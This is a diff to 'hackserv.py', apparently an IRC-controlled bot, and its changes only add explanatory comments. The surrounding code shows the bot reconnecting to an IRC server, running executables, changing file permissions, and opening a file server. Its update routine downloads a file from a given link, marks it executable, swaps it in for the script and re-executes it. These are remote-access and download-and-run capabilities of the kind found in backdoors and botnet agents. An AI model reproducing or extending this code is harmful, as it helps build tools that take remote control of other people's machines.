@@ -89,7 +89,7 @@ connected = False # Variable to say if bot is connected or not.
 def ircsend(msg):
     ircsock.send(bytes(str(msg) +"\n", "UTF-8")) # Send data to IRC server.
 
-def connect():
+def connect(): # Connect to the IRC network.
     global connected
     while not connected:
         try: # Try and connect to the IRC server.
@@ -114,7 +114,7 @@ def connect():
             time.sleep(10)
             reconnect()
 
-def reconnect():
+def reconnect(): # Reconnect to the IRC network.
     global connected # Set 'connected' variable
     global ircsock # Set 'ircsock' variable
     while not connected:
@@ -281,24 +281,24 @@ def execute(xType, file): # Run executable file.
     else:
         runcmd_noout('./'+ file)
     
-def chFileMod(modFile, modType):
+def chFileMod(modFile, modType): # Change the file permissions. (chmod)
     os.chmod(str(modFile), modType)
     sendntc(str(modFile) +" mode was changed to: "+ str(modType) +"!", adminname)
 
 def update(link, dlFile): # Update bot.
     if debugmode:
         print("[==>] Downloading update file: "+ str(dlFile))
-    download(link, dlFile)
+    download(link, dlFile) # Download the updated file.
     if debugmode:
         print("[chmod +x] Making "+ str(dlFile) +" executable!")
-    chFileMod(dlFile, 0o755)
+    chFileMod(dlFile, 0o755) # Make the file executable.
     if debugmode:
         print("[<==] Backing up old hackserv.py and renaming "+ str(dlFile) +" to hackserv.py")
-    os.rename("hackserv.py", "hackserv.py.bak")
-    os.rename(str(dlFile), "hackserv.py")
+    os.rename("hackserv.py", "hackserv.py.bak") # Backup the original 'hackserv.py' file.
+    os.rename(str(dlFile), "hackserv.py") # Rename the new file to 'hackserv.py'
     if debugmode:
         print("[+] Restarting hackserv.py!")
-    os.execv(__file__, sys.argv)
+    os.execv(__file__, sys.argv) # Exit the old process and start the new one.
     sendntc("[*] Success! "+ str(dlFile) +" was renamed and old 'hackserv.py' was successsfully backed up and updated!", adminname)
     
 def retrieveFile(fsname, fs, fsaddr): # Receive a file.
@@ -335,7 +335,7 @@ def fileServer(): # Open a file server on this device.
         t.start()
     s.close()
 
-def srtChk(): # Startup Check.
+def srtChk(): # Startup Check. (Still in testing!)
     script = sys.argv
     name = str(script[0])
     hd = str(os.path.expanduser('~'))
@@ -375,7 +375,7 @@ def srtChk(): # Startup Check.
             if debugmode:
                 print("ERROR: " + str(mdr))
 
-def main():
+def main(): # This is the main function for all of the bot controls.
     global connected
     global botnick
     global ip
